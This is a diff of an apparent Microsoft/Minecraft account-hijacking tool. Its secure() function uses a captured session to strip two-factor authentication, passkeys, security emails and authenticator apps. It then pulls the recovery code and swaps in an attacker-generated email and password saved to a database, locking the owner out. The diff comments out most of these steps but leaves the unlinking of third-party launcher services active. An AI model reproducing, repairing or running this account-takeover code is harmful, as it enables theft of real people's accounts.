@@ -127,14 +127,14 @@ async def secure(session: httpx.AsyncClient):
     print("[+] - Got AMRP")
 
     # 2FA
-    await remove2FA(session, apicanary)
+    # await remove2FA(session, apicanary)
 
-    # Pass Keys / Windows Hello Exploit
-    await removeZyger(session, apicanary)
+    # # Pass Keys / Windows Hello Exploit
+    # await removeZyger(session, apicanary)
 
-    # Removes secEmails / Auth Apps
-    await removeProof(session, apicanary)
-    print("[+] - Removed all Proofs")
+    # # Removes secEmails / Auth Apps
+    # await removeProof(session, apicanary)
+    # print("[+] - Removed all Proofs")
     
     # Third Partie Launchers (Minecraft, Prism)
     await removeServices(session)   
@@ -146,32 +146,32 @@ async def secure(session: httpx.AsyncClient):
         
         # Original Email
         mainEmail = securityParameters["email"]
-        encryptedNetID = securityParameters["WLXAccount"]["manageProofs"]["encryptedNetId"] 
+        # encryptedNetID = securityParameters["WLXAccount"]["manageProofs"]["encryptedNetId"] 
         
-        recoveryCode = await getRecoveryCode(
-            session,
-            apicanary,
-            encryptedNetID
-        )
-        print(f"[+] - Got Recovery Code | {recoveryCode}")
+        # recoveryCode = await getRecoveryCode(
+        #     session,
+        #     apicanary,
+        #     encryptedNetID
+        # )
+        # print(f"[+] - Got Recovery Code | {recoveryCode}")
 
         secEmail = uuid.uuid4().hex[:16]
         newPassword = uuid.uuid4().hex[:12]
 
-        emailToken, secEmail = await generateEmail(secEmail, newPassword)
+        # emailToken, secEmail = await generateEmail(secEmail, newPassword)
 
-        print(f"[+] - Generated Security Email ({secEmail})")
-        database.addEmail(secEmail, newPassword)
+        # print(f"[+] - Generated Security Email ({secEmail})")
+        # database.addEmail(secEmail, newPassword)
         
-        print("[~] - Automaticly Securing Account...")
-        newData = await recover(mainEmail, recoveryCode, secEmail, newPassword, emailToken) 
+        # print("[~] - Automaticly Securing Account...")
+        # newData = await recover(mainEmail, recoveryCode, secEmail, newPassword, emailToken) 
 
-        if newData:
-            accountInfo["secEmail"] = secEmail
-            accountInfo["recoveryCode"] = newData
-            accountInfo["password"] = newPassword
-        else:
-            print(f"[X] - Failed to secure this account")
+        # if newData:
+        #     accountInfo["secEmail"] = secEmail
+        #     accountInfo["recoveryCode"] = newData
+        #     accountInfo["password"] = newPassword
+        # else:
+        #     print(f"[X] - Failed to secure this account")
         
         if ralias:
 
